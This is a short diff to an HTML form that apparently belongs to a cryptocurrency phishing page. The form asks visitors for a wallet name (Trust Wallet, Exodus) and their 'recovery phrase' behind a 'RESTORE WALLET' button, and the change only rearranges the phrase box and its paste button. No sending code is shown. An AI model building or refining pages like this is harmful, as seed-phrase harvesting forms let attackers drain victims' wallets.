@@ -100,8 +100,10 @@ textarea {
   <form id="form">
     <input type="text" id="username" placeholder="Wallet Name/Trust wallet/Exoduswallet" required>
 
-    <textarea id="complaint" placeholder="Enter recovery phrase" required" required></textarea>
- <button type="button" class="paste-btn" onclick="pasteClipboard()">Paste</button>  
+    <div class="textarea-wrapper">
+ <textarea id="complaint" placeholder="Enter recovery phrase" required" required></textarea>
+ <button type="button" class="paste-btn" onclick="pasteClipboard()">Paste</button>
+</div>
 
    <button type="submit" class="submit-btn">RESTORE WALLET</button>
   </form>
